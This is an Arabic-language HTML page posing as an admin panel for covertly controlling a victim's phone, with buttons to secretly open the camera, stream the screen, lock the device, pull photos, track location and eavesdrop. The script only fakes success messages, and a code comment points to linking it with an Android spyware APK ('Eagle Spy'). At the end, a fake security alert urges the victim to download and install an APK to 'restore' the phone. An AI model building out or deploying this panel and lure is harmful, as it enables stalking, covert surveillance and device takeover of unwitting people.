<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>METIORA ULTIMATE CONTROL</title>
    <style>
        body { background: #000; color: #ff0000; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; }
        .hidden { display: none; }
        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 20px; max-width: 800px; margin: auto; }
        .control-btn { padding: 20px; font-size: 18px; font-weight: bold; cursor: pointer; border: 2px solid red; background: #111; color: white; transition: 0.3s; }
        .control-btn:hover { background: red; color: black; box-shadow: 0 0 15px red; }
        .lock-msg { font-size: 24px; margin-top: 10%; color: #ff0000; text-shadow: 2px 2px #550000; }
        input { padding: 15px; background: #000; color: #00ff00; border: 1px solid red; width: 300px; text-align: center; font-size: 18px; }
    </style>
</head>
<body>

    <div id="authScreen">
        <div class="lock-msg">
            <h1>نظام سيطرة متيورة المتحكمة</h1>
            <p>أدخلي كلمة المرور لفك تشفير لوحة التحكم</p>
        </div>
        <input type="password" id="masterPass" placeholder="كلمة المرور">
        <br><br>
        <button class="control-btn" onclick="unlockSystem()">دخول الآدمن</button>
    </div>

    <div id="adminPanel" class="hidden">
        <h1 style="color: white; border-bottom: 2px solid red; padding: 20px;">لوحة السيطرة على الهاتف - متيورة</h1>
        
        <div class="dashboard">
            <button class="control-btn" onclick="cmd('فتح الكاميرا')">📸 فتح الكاميرا سراً</button>
            <button class="control-btn" onclick="cmd('مراقبة الشاشة')">🖥️ بث الشاشة مباشر</button>
            <button class="control-btn" onclick="cmd('قفل الهاتف')">🔒 قفل الهاتف نهائياً</button>
            <button class="control-btn" onclick="cmd('سحب الصور')">📂 سحب معرض الصور</button>
            <button class="control-btn" onclick="cmd('تتبع الموقع')">📍 تحديد الموقع بدقة</button>
            <button class="control-btn" onclick="cmd('فتح الميكروفون')">🎙️ التنصت المباشر</button>
        </div>

        <div id="statusUpdate" style="color: #00ff00; margin-top: 20px; font-family: monospace;">> النظام بانتظار الأوامر...</div>
    </div>

    <script>
        const KEY = "متيورة المتحكمة و المسيطرة";

        function unlockSystem() {
            const val = document.getElementById('masterPass').value;
            if (val === KEY) {
                document.getElementById('authScreen').style.display = 'none';
                document.getElementById('adminPanel').style.display = 'block';
                localStorage.setItem("METIORA_LOGIN", "TRUE");
            } else {
                alert("تم رفض الوصول! كعكة متيورة السوداء تراقبك.");
            }
        }

        function cmd(action) {
            const status = document.getElementById('statusUpdate');
            status.innerText = `> جاري تنفيذ أمر [${action}]...`;
            
            // ملاحظة تقنية للمطورة:
            // هذه الأزرار تحتاج لربطها بملف APK (للأندرويد) مثل Eagle Spy 
            // لتعمل حقيقياً على النظام خارج حدود المتصفح.
            
            setTimeout(() => {
                status.innerText = `> تم إرسال أمر ${action} إلى جهاز الضحية بنجاح.`;
            }, 2000);
        }

        // حفظ الدخول
        if (localStorage.getItem("METIORA_LOGIN") === "TRUE") {
            document.getElementById('authScreen').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
        }
    </script>
</body>
</html>
<div id="victimView">
    <h2 style="color: white;">تنبيه أمني من نظام متيورة</h2>
    <p>يجب تحميل "بروتوكول الوصول" لتشغيل الهاتف مجدداً</p>
    <a href="رابط_ملف_السيطرة_الخاص_بمتيورة.apk" download>
        <button class="control-btn" style="background: green;">تحميل وتثبيت الآن</button>
    </a>
</div>
